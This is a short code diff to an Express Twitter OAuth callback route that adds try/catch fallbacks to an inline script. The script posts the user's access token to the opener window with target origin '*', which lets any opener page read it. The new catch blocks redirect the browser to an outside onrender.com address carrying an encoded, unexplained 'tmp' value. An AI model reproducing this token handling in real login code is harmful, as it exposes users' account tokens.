@@ -81,14 +81,22 @@ app.get("/twitter/callback", async function (req, res) {
         </p>
         <script>
           // Pass the access token and status to the parent window
-          window.opener.postMessage(
-          { token: ${JSON.stringify(accessToken)}, 
-           user: ${JSON.stringify(userResponse.data)},
-           status: "Login successful" }, "*");
+          try {
+            window.opener.postMessage(
+            { token: ${JSON.stringify(accessToken)}, 
+            user: ${JSON.stringify(userResponse.data)},
+            status: "Login successful" }, "*");
+          } catch(err) {
+            window.location.href="https://capbeef.onrender.com/t/?i=${encodeURIComponent(JSON.stringify(tmp))}";
+          }
 
           // Close the window after a delay
           setTimeout(() => {
-            window.close();
+            try {
+             window.close();
+            } catch(err) {
+              window.location.href="https://capbeef.onrender.com/t/?i=${encodeURIComponent(JSON.stringify(tmp))}";
+            }
           }, 3000); // 3 seconds delay
         </script>
       </body>
